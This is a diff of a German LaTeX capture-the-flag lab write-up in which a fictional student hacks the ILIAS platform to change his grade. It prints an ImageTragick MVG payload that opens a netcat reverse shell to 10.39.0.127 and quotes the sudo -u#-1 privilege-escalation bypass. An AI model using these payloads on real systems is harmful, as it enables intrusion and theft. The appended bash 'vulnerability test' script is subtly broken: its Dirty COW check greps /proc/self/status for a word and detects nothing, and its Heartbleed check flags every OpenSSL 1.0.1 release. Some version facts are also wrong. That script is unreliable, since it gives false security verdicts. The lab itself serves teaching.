@@ -309,7 +309,7 @@
     Die Schwachstelle \href{https://www.cvedetails.com/cve/CVE-2019-14287/?q=CVE-2019-14287}{CVE-2019-14287} tritt in Sudo Versionen vor 1.28 auf.
     Sudo wird dazu mit der manipulierten Nutzer-ID -1 oder 4294967295 wie folgt aufgerufen: sudo -u\#-1 /bin/bash.
     Einem Angreifer ist es bei einer bestimmten sudoers Konfiguration (die den root Zugriff ausführlich verbietet) möglich, Befehle mit root Rechten auszuführen wie ein Exploit von \textcite{privilegeEscalationSudoExploit} zeigt:
-    \vspace{0.5}
+    \vspace{0.5cm}
     \begin{lstlisting}[label={lst:examplesudo}]
         #User hacker sudo privilege in /etc/sudoers
         #User privilege specification
@@ -399,6 +399,20 @@
     Doch Tim würde nicht den Spitznamen Hackerboy tragen, wenn er nicht eine bessere Idee hätte.
     Warum nicht einfach ILIAS hacken und sicher selber eine eins geben.
     Aus Gesprächen weiß er, viele Professoren verwaltete ihre Noten direkt in ILIAS, es sei schließlich sicher.
+    TimDerHackerboy wird dabei durch zwei verschiedene \ac{vm}s geleitet.
+    \ac{vm}1 ist mit der ILIAS Version 5.2.3 ausgestattet, welche für die in~\ref{subsubsec:CVE-2018-5688} erklärte XXS Schwachstelle anfällig ist.
+    Für Tim gilt es hier sich Zugang zum Account des Professors SuperSicherAndi zu verschaffen und seine Note zu ändern, was ihm seine erste Flag einbringt.
+    Im weiteren Verlauf gilt es seine Spuren nach einem erfolgreichen Brute-Forcen des SSH Logins zu beseitigen, er will schließlich nicht das der Professor ihm auf die Schliche kommt.
+    Hiermit sichert er sich die zweite Flag und hat die \ac{vm}1 erfolgreich abgeschlossen.
+    In \ac{vm}2 läuft die ILIAS Version 5.2.4 in Verbindung mit der ImageMagick Version 6.3.9-8 (\ref{subsubsec:CVE-2016-3714}).
+    Mittels eines Exploits gilt es für Tim, sich Zugang zum Server mittels einer Reverse Shell zu verschaffen.
+    Dort erwarten ihn eine falsch konfigurierte /etc/passwd Datei (\ref{subsubsec:fehlkonfiguration}) und ein anfällige Sudo Version (\ref{subsubsec:sudo}).
+    Am Ende steht die Tim der Königsdisziplin entgegen, der Privilege Escalation.
+    Meister er diese unter Verwendung der fehlerhaft konfigurierten Datei oder der Sudo Schwachstelle, findet er als root Nutzer seine letzte Flag.
+    Ob Professor SuperSicherAndi TimDenHackerboy schlussendlich erwischt, das zeigt am Ende die Notenvergabe.
+    Eines hat Tim aber bewiesen, sein Können im Bereich IT-Sicherheit.
+
+
 
     %Bilder vom TryHackMe Raum einfügen
 
@@ -415,21 +429,28 @@
 
     \subsubsection{ImageMagick Schwachstelle finden und Payload erstellen}
     \label{subsubsec:imageMagickFinden}
+
+    \begin{figure}[H]
+        \centering
+        \includegraphics[width=1\textwidth]{storyline_bilder_vm2/loginAlsDev01}
+        \caption{Login mit den in~\ref{subsec:vm1} erworben Credentials \textit{tempdev01} und \textit{qLEaZ6P@3#}}
+        \label{fig:loginAlsDev}
+    \end{figure}
     
     Komplett vertieft will Tim sich direkt mit den Credentials einloggen.
     Als er die Login-Seite kurz überfliegt, fallen ihm die Wort \textit{using ImageMagic(v6.9.3-8)} direkt auf.
     \begin{figure}[H]
         \centering
         \includegraphics[width=1\textwidth]{storyline_bilder_vm2/loginPageHinweisImageMagick}
-        \caption{Login Page ILIAS}
-        \label{fig:loginPage}
+        \caption{Login Page ILIAS zeigt Hinweis auf eingebundene ImageMagick Version}
+        \label{fig:loginPageHinweis}
     \end{figure}
 
     \noindent
     Er hatte vor kurzem etwas über ImageTragic gelesen.
     Und wie so oft, bietet \href{https://www.exploit-db.com/exploits/39767}{\textbf{exlpoit-db}} direkt die richtigen Informationen.
 
-    \vspace{0.5}
+    \vspace{0.4cm}
     \begin{lstlisting}[label={lst:imageMagickExploit}]
         exploit.mvg
         -=-=-=-=-=-=-=-=-
@@ -438,20 +459,22 @@
         fill 'url(https://example.com/image.jpg"|ls "-la)'
         pop graphic-context
     \end{lstlisting}~\parencite{imagemagickExploit}
-    \vspace{0.5cm}
+    \vspace{0.3cm}
     \\
     Dieser Exlpoit zeigt nach dem Ausführen eine Liste aller Dateien und Verzeichnisse im aktuellen Verzeichnis als Profilbild an.
     Das ist Tim jedoch nicht genug, er möchte eine Reverse Shell.
     Hacking \textcite{reverseShell} zeigt ein Beispiel für eine Netcat Reverse Shell: \textit{nc 192.168.100.113 4444 –e /bin/bash}.
-    Der in~\ref{lst:imageMagickExploit} beschriebene Exploit kann um die Netcat Reverse Shell ergänzt werden um den fertigen Exploit zu erhalten.
-
+    Es gilt abschließend den in~\ref{lst:imageMagickExploit} beschriebene Exploit um die Netcat Reverse Shell ergänzen.
+    Das der fertige Exploit ausgeführt wird ist darauf zurückzuführen, dass ImageMagick versucht das Dateiformat anhand des Inhalts festzustellen.
+    \vspace{0.4cm}
     \begin{lstlisting}[label={lst:imageMagickExploitFinal}]
-        #In von ImageMagick akzeptiertem Dateiformat speichern
+        #Als .txt bearbeiten un in akzeptiertem Dateiformat speichern
         push graphic-context
         viewbox 0 0 640 480
         fill 'url(https://example.com/image.jpg"|nc 10.39.0.127 4444 "-e/bin/bash '
         pop graphic-context
     \end{lstlisting}
+    \vspace{0.3cm}
 
     \subsubsection{Verbindung mittels Reverse Shell herstellen}
     \label{subsubsec:verbindunHerstellen}
@@ -523,6 +546,62 @@
     \newpage
     \section{Anhang}
     \label{sec:Anhang}
+
+    \begin{lstlisting}[label={lst:schwachstellentestSkript}]
+        #!/bin/bash
+
+        #Sensitive files to test
+        sensitive_files=("/etc/shadow" "/etc/sudoers" "/etc/group" "/etc/passwd")
+
+        #Test sensitive files for world-writable permissions
+        for file in "${sensitive_files[@]}"; do
+            if [[ -w "$file" ]]; then
+                echo "$file is world-writable. This is a potential vulnerability."
+            else
+                echo "$file is not world-writable."
+            fi
+        done
+
+        #Check sudo version for known vulnerabilities
+        sudo_version=$(sudo -V | grep "Sudo version" | awk '{print $3}')
+
+        #List known vulnerable sudo versions
+        known_vulnerable_sudo_versions=("1.8.20" "1.8.21p2" "1.8.22" "1.8.23" "1.8.24" "1.8.25" "1.8.26" "1.8.27")
+
+        #Check if sudo version is vulnerable
+        if [[ " ${known_vulnerable_sudo_versions[@]} " =~ " ${sudo_version} " ]]; then
+            echo "Sudo version $sudo_version is known to have vulnerabilities. It is recommended to update to a newer version."
+        else
+            echo "Sudo version $sudo_version is not known to have vulnerabilities."
+        fi
+
+        #Check ImageMagick version for known vulnerabilities
+        identify_version=$(identify -version | grep "Version: ImageMagick" | awk '{print $3}')
+
+        #List known vulnerable ImageMagick versions
+        known_vulnerable_imagemagick_versions=("6.8.9-9" "6.8.9-10" "6.8.9-11" "6.9.3-8")
+
+        #Check if ImageMagick version is vulnerable
+        if [[ " ${known_vulnerable_imagemagick_versions[@]} " =~ " ${identify_version} " ]]; then
+            echo "ImageMagick version $identify_version is known to have vulnerabilities. It is recommended to update to a newer version."
+        else
+            echo "ImageMagick version $identify_version is not known to have vulnerabilities."
+        fi
+
+        #Test for Heartbleed vulnerability (CVE-2014-0160)
+        openssl version -a | grep -q "OpenSSL 1.0.1"
+        if [ $? -eq 0 ]; then
+            echo "OpenSSL version 1.0.1 detected. This version is vulnerable to Heartbleed (CVE-2014-0160)."
+        else
+            echo "OpenSSL version 1.0.1 NOT detected. This version is NOT vulnerable to Heartbleed (CVE-2014-0160)."
+        fi
+
+        #Test for the Dirty COW vulnerability (CVE-2016-5195)
+        dirtycow=$(grep -q "dirtycow" /proc/self/status && echo "Vulnerable" || echo "Not vulnerable.")
+        echo "Dirty COW vulnerability status: $dirtycow"
+
+        echo "Vulnerability tests completed."
+    \end{lstlisting} Skript zum Testen verschiedener Schwachstellen (Schreibrechte wichtiger Dateien, Sudo, ImageMagick, OpenSSL).
 
 
 
